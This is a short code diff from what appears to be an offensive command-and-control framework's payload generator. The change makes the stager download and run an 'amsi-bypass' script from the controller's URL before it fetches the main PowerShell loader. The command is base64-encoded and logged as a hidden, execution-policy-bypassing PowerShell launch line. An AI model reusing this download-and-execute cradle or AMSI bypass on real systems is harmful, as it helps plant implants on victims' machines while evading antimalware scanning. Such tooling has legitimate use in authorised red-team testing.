@@ -911,8 +911,9 @@ class Payloads(object):
         insert_hosted_file("%s%s" % (self.QuickCommand, name), b64shellcodefile,
                            "text/html", "No", "Yes")
 
-        command = f''' "IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}_psload')" '''
-        b64command = base64.b64encode(command.encode('UTF-16LE')).decode("UTF-8")
+        command = f''' "IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}amsi-bypass');IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}_psload')" '''
+        b64command = f''' IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}amsi-bypass');IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}_psload') '''
+        b64command = base64.b64encode(b64command.encode('UTF-16LE')).decode("UTF-8")
         self.QuickstartLog(
             f"Download and execute C# Powershell Injector: powershell -exec bypass -Noninteractive -windowstyle hidden -c %s" % command)
         self.QuickstartLog(
